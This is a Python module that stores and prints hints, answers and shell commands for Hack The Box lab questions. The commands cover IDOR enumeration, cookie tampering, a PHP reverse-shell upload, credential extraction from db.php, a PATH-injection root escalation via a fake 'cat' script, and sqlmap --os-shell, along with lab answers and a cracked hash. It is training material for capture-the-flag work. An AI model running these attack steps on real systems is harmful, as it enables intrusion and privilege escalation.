"""
HTB Questions Helper - Guides for common HTB questions
"""

from utils.colors import Colors

class HTBQuestions:
    def __init__(self):
        self.questions = {
            "admin_id": {
                "question": "What is the access ID of the admin user?",
                "hints": [
                    "1. Login with guest/guest credentials first",
                    "2. Look for an 'Account' or 'Uploads' section",
                    "3. Check URLs - they often contain user IDs",
                    "4. Inspect page source for hidden information",
                    "5. The admin user ID is often a low number"
                ],
                "steps": [
                    "curl -X POST http://TARGET/cdn-cgi/login/ -d 'username=guest&password=guest' -c cookies.txt",
                    "curl http://TARGET/cdn-cgi/login/admin.php?content=accounts&id=1 -b cookies.txt",
                    "Try incrementing the ID parameter to find other users"
                ]
            },
            "cookie": {
                "question": "What can be modified in Firefox to get access to the upload page?",
                "hints": [
                    "Answer: cookie",
                    "Use Firefox Developer Tools (F12) > Storage > Cookies",
                    "Modify user role or access level in the cookie"
                ]
            },
            "login_page": {
                "question": "What is the path to the directory on the webserver that returns a login page?",
                "hints": [
                    "Answer: /cdn-cgi/login/",
                    "Check page source for login references",
                    "Use: curl -s http://TARGET | grep -i login"
                ]
            },
            "robert_password": {
                "question": "What is the file that contains the password that is shared with the robert user?",
                "hints": [
                    "You need a shell first - upload a reverse shell",
                    "Look in /var/www/html/ directory", 
                    "Database configuration files often contain passwords",
                    "Answer: db.php",
                    "The file path is: /var/www/html/cdn-cgi/login/db.php"
                ],
                "steps": [
                    "1. Upload a PHP reverse shell using the upload functionality",
                    "2. Get a shell as www-data",
                    "3. cd /var/www/html/cdn-cgi/login/",
                    "4. cat db.php",
                    "5. Look for robert's password in the database connection"
                ]
            },
            "upload_directory": {
                "question": "On uploading a file, what directory does that file appear in on the server?",
                "hints": [
                    "Think about the most common upload directory name",
                    "You already found this directory during enumeration",
                    "Check your gobuster/dirb results",
                    "It's a simple, obvious directory name",
                    "Answer format: /directoryname/"
                ],
                "steps": [
                    "Review your enumeration results: gobuster dir -u http://TARGET",
                    "The directory was already discovered",
                    "Common upload directories: /uploads/, /upload/, /files/, /images/"
                ]
            },
            "bugtracker_group": {
                "question": "What executible is run with the option '-group bugtracker' to identify all files owned by the bugtracker group?",
                "hints": [
                    "This is a standard Linux command for finding files",
                    "It's used to search for files based on various criteria",
                    "The command starts with 'f' and ends with 'd'",
                    "Answer: find",
                    "Full command: find / -group bugtracker 2>/dev/null"
                ],
                "steps": [
                    "You need a shell as www-data or robert first",
                    "Use: find / -group bugtracker 2>/dev/null",
                    "This will show all files owned by the bugtracker group",
                    "Look for SUID binaries or interesting files"
                ]
            },
            "bugtracker_suid": {
                "question": "Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?",
                "hints": [
                    "This is about SUID (Set User ID) binaries",
                    "Check the bugtracker binary permissions with: ls -la /usr/bin/bugtracker",
                    "Look for the 's' in the permissions (e.g., -rwsr-xr-x)",
                    "SUID binaries run with the privileges of the file owner",
                    "Answer: root"
                ],
                "steps": [
                    "1. Find bugtracker: find / -name bugtracker 2>/dev/null",
                    "2. Check permissions: ls -la /usr/bin/bugtracker",
                    "3. If it shows -rwsr-xr-x and owner is root",
                    "4. The binary runs with root privileges regardless of who executes it",
                    "5. This is the privilege escalation vector!"
                ]
            },
            "suid_meaning": {
                "question": "What SUID stands for?",
                "hints": [
                    "SUID is a special permission in Linux",
                    "It's a 3-word acronym",
                    "S = Set",
                    "U = User", 
                    "ID = ID",
                    "Answer: Set owner User ID"
                ],
                "steps": [
                    "SUID = Set User ID",
                    "When set on an executable, it runs with the permissions of the file owner",
                    "Not the permissions of the user who runs it",
                    "Common privilege escalation vector in CTFs"
                ]
            },
            "vaccine_admin_password": {
                "question": "What is the password for the admin user on the website?",
                "hints": [
                    "First crack the backup.zip file",
                    "Look in index.php after extraction",
                    "You'll find an MD5 hash",
                    "Decode the MD5 hash to get the password",
                    "Common MD5 decoder sites or hashcat can help"
                ],
                "steps": [
                    "1. Crack backup.zip (password often: 741852963)",
                    "2. Extract: unzip -P 741852963 backup.zip",
                    "3. Check index.php for MD5 hash",
                    "4. The hash is: 2cb42f8734ea607eefed3b70af13bbd3",
                    "5. Decode MD5 to get password: qwerty789"
                ]
            },
            "insecure_executable": {
                "question": "What is the name of the executable being called in an insecure manner?",
                "hints": [
                    "Run the bugtracker binary and analyze what it does",
                    "Use strings or ltrace to see what commands it calls",
                    "Look for system calls without full paths",
                    "It's a common Linux text manipulation command",
                    "Answer: cat"
                ],
                "steps": [
                    "1. Run bugtracker to see what it does",
                    "2. Use: strings /usr/bin/bugtracker | grep -E '(bin|cat|echo)'",
                    "3. Or use: ltrace /usr/bin/bugtracker",
                    "4. Notice it calls 'cat' without full path (/bin/cat)",
                    "5. This allows PATH injection for privilege escalation!",
                    "6. Create malicious cat: echo '/bin/sh' > /tmp/cat && chmod +x /tmp/cat",
                    "7. export PATH=/tmp:$PATH",
                    "8. Run bugtracker to get root shell"
                ]
            },
            "sqlmap_command_execution": {
                "question": "What option can be passed to sqlmap to try to get command execution via the sql injection?",
                "hints": [
                    "SQLMap has options for OS command execution",
                    "It can try to get an interactive shell",
                    "The option starts with '--os'",
                    "Answer: --os-shell"
                ],
                "steps": [
                    "1. Basic SQLMap with OS shell:",
                    "sqlmap -u 'http://TARGET/dashboard.php?search=test' --cookie='PHPSESSID=xxx' --os-shell",
                    "2. Other OS command options:",
                    "--os-cmd='id'  # Execute a single command",
                    "--os-pwn       # Prompt for out-of-band shell",
                    "3. Full example:",
                    "sqlmap -u 'http://10.129.95.174/dashboard.php?search=test' --cookie='PHPSESSID=xxx' --os-shell --batch"
                ]
            }
        }
    
    def search_question(self, query):
        """Search for questions matching the query"""
        query_lower = query.lower()
        matches = []
        
        for key, data in self.questions.items():
            if query_lower in data["question"].lower() or query_lower in key:
                matches.append((key, data))
        
        return matches
    
    def display_help(self, question_key):
        """Display help for a specific question"""
        if question_key not in self.questions:
            print(f"{Colors.RED}Question not found{Colors.RESET}")
            return
        
        q_data = self.questions[question_key]
        print(f"\n{Colors.CYAN}Question:{Colors.RESET} {q_data['question']}")
        print(f"\n{Colors.YELLOW}Hints:{Colors.RESET}")
        for i, hint in enumerate(q_data['hints'], 1):
            print(f"  {i}. {hint}")
        
        if 'steps' in q_data:
            print(f"\n{Colors.GREEN}Suggested commands:{Colors.RESET}")
            for step in q_data['steps']:
                print(f"  $ {step}")
    
    def list_questions(self):
        """List all available questions"""
        print(f"\n{Colors.CYAN}Available HTB Questions:{Colors.RESET}")
        for key, data in self.questions.items():
            print(f"  • {Colors.YELLOW}{key}{Colors.RESET}: {data['question'][:60]}...")